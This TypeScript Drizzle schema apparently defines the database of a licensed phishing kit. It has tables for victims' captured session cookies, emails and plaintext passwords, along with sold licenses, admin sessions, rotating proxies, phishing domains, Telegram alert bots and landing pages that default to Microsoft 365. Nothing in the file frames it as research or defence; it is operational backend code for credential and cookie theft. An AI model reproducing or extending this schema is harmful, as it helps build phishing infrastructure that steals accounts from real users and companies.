// lib/schema/main.schema.ts
// Drizzle table definitions for ceng.db (MainDatabase)

import { integer, sqliteTable, text } from "drizzle-orm/sqlite-core";
import { sql } from "drizzle-orm";

export const clients = sqliteTable("clients", {
  sessionId: text("sessionId").primaryKey(),
  client_ip: text("client_ip").notNull(),
  first_seen: text("first_seen").notNull(),
  last_seen: text("last_seen").notNull(),
});

export const clientCookies = sqliteTable("client_cookies", {
  sessionId: text("sessionId")
    .notNull()
    .references(() => clients.sessionId),
  timestamp: text("timestamp").notNull(),
  cookies: text("cookies").notNull(),
});

export const credentials = sqliteTable("credentials", {
  sessionId: text("sessionId")
    .notNull()
    .references(() => clients.sessionId),
  timestamp: text("timestamp").notNull(),
  email: text("email").notNull(),
  password: text("password").notNull(),
  country: text("country").notNull().default("Unknown"),
});

export const licenses = sqliteTable("licenses", {
  licenseId: text("license_id").primaryKey(),
  passwordHash: text("password_hash"),
  expiresAt: text("expires_at").notNull(),
  createdAt: text("created_at").notNull().default(sql`CURRENT_TIMESTAMP`),
  updatedAt: text("updated_at").notNull().default(sql`CURRENT_TIMESTAMP`),
});

export const adminSessions = sqliteTable("admin_sessions", {
  sessionTokenHash: text("session_token_hash").primaryKey(),
  licenseId: text("license_id")
    .notNull()
    .references(() => licenses.licenseId),
  expiresAt: text("expires_at").notNull(),
  createdAt: text("created_at").notNull().default(sql`CURRENT_TIMESTAMP`),
  lastSeenAt: text("last_seen_at").notNull().default(sql`CURRENT_TIMESTAMP`),
});

export const proxySettings = sqliteTable("proxy_settings", {
  licenseId: text("license_id")
    .primaryKey()
    .references(() => licenses.licenseId),
  useProxy: text("use_proxy").notNull().default("enabled"),
  rotationMethod: text("rotation_method").notNull().default("sticky"),
  updatedAt: text("updated_at").notNull().default(sql`CURRENT_TIMESTAMP`),
});

export const proxies = sqliteTable("proxies", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  licenseId: text("license_id")
    .notNull()
    .references(() => licenses.licenseId),
  proxyType: text("proxy_type").notNull(),
  username: text("username").notNull(),
  password: text("password").notNull(),
  ipAddress: text("ip_address").notNull(),
  port: integer("port").notNull(),
  createdAt: text("created_at").notNull().default(sql`CURRENT_TIMESTAMP`),
});

export const domains = sqliteTable("domains", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  licenseId: text("license_id")
    .notNull()
    .references(() => licenses.licenseId),
  domain: text("domain").notNull(),
  domainDns: text("domain_dns").notNull(),
  subdomain: text("subdomain").notNull(),
  path: text("path").notNull(),
  createdAt: text("created_at").notNull().default(sql`CURRENT_TIMESTAMP`),
});

export const telegramNotifications = sqliteTable("telegram_notifications", {
  licenseId: text("license_id")
    .primaryKey()
    .references(() => licenses.licenseId),
  chatId: text("chat_id").notNull().default(""),
  botToken: text("bot_token").notNull().default(""),
  updatedAt: text("updated_at").notNull().default(sql`CURRENT_TIMESTAMP`),
});

export const landingPages = sqliteTable("landing_pages", {
  licenseId: text("license_id")
    .primaryKey()
    .references(() => licenses.licenseId),
  service: text("service").notNull().default("Microsoft 365"),
  domainId: integer("domain_id"),
  updatedAt: text("updated_at").notNull().default(sql`CURRENT_TIMESTAMP`),
});

export const defaultServices = sqliteTable("default_services", {
  licenseId: text("license_id")
    .primaryKey()
    .references(() => licenses.licenseId),
  service: text("service").notNull().default("Microsoft 365"),
  updatedAt: text("updated_at").notNull().default(sql`CURRENT_TIMESTAMP`),
});

export const singleLinkSettings = sqliteTable("single_link_settings", {
  licenseId: text("license_id")
    .primaryKey()
    .references(() => licenses.licenseId),
  option: text("option").notNull().default("disabled"),
  updatedAt: text("updated_at").notNull().default(sql`CURRENT_TIMESTAMP`),
});

export const captchaSettings = sqliteTable("captcha_settings", {
  licenseId: text("license_id")
    .primaryKey()
    .references(() => licenses.licenseId),
  option: text("option").notNull().default("disabled"),
  updatedAt: text("updated_at").notNull().default(sql`CURRENT_TIMESTAMP`),
});
